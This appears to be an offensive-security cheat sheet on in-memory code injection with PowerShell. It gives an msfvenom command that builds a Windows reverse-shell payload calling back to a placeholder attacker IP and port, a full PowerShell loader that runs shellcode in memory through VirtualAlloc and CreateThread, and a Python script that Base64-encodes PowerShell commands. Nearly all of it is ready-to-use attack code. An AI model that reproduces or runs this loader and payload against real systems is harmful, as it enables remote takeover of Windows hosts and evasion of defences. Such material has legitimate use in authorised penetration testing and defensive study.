# In-Memory Injection with Powershell Script

### 1) Payload

    msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc

### 2) Script

    # Import necessary functions from kernel32.dll and msvcrt.dll
    $importCode = '
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("msvcrt.dll", SetLastError=false)]
    public static extern IntPtr memset(IntPtr dest, int c, UInt32 count);
    ';
    
    # Add the imported functions to the PowerShell session
    $win32Functions = Add-Type -MemberDefinition $importCode -Name "Win32API" -Namespace "Win32" -PassThru;
    
    # Define the shellcode (replace with actual shellcode)
    [Byte[]] $shellcode = [PLACE YOUR SHELLCODE HERE];
    
    # Allocate memory for the shellcode
    $memSize = 0x1000;
    if ($shellcode.Length -gt $memSize) { $memSize = $shellcode.Length };
    $allocatedMemory = $win32Functions::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40);
    
    # Copy the shellcode into the allocated memory
    for ($i = 0; $i -lt $shellcode.Length; $i++) {
        $win32Functions::memset($allocatedMemory + $i, $shellcode[$i], 1);
    }
    
    # Execute the shellcode in a new thread
    $win32Functions::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);
    
    # Keep the script running
    # This part of the script ensures that the PowerShell process doesn't terminate immediately after the shellcode is executed.
    # If the script exits too soon, the thread created to execute the shellcode might be terminated, stopping the shellcode.
    # By keeping the script alive with an infinite loop and a sleep command, the shellcode has sufficient time to run.
    while ($true) {
        Start-Sleep 60;
    }

Alternate script: https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py

    #!/usr/bin/env python
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-
    __version__ = '0.1'
    __author__ = 'Carlos Perez, Carlos_Perez@darkoperator.com'
    __doc__ = """
    PSEncoder http://www.darkoperator.com by Carlos Perez, Darkoperator
    
    Encodes a given Windows PowerShell script in to a Base64 String that can be
    passed to the powershell.exe program as an option.
    """
    import base64
    import sys
    import re
    import os
    import getopt
    
    def powershell_encode(data):
        # blank command will store our fixed unicode variable
        blank_command = ""
        powershell_command = ""
        # Remove weird chars that could have been added by ISE
        n = re.compile(u'(\xef|\xbb|\xbf)')
        # loop through each character and insert null byte
        for char in (n.sub("", data)):
            # insert the nullbyte
            blank_command += char + "\x00"
        # assign powershell command as the new one
        powershell_command = blank_command
        # base64 encode the powershell command
        powershell_command = base64.b64encode(powershell_command.encode())
        return powershell_command.decode("utf-8")
    
    def usage():
        print("Version: {0}".format(__version__))
        print("Usage: {0} <options>\n".format(sys.argv[0]))
        print("Options:")
        print("   -h, --help                  Show this help message and exit")
        print("   -s, --script      <script>  PowerShell Script.")
        sys.exit(0)
    
    def main():
        try:
            options, args = getopt.getopt(sys.argv[1:], 'hs:', ['help', 'script='])
        except getopt.GetoptError:
            print("Wrong Option Provided!")
            usage()
        if len(sys.argv) == 1:
            usage()
    
        for opt, arg in options:
            if opt in ('-h', '--help'):
                usage()
            elif opt in ('-s', '--script'):
                script_file = arg
                if not os.path.isfile(script_file):
                    print("The specified powershell script does not exists")
                    sys.exit(1)
                else:
                    ps_script = open(script_file, 'r').read()
                    print(powershell_encode(ps_script))
    
    if __name__ == "__main__":
        main()

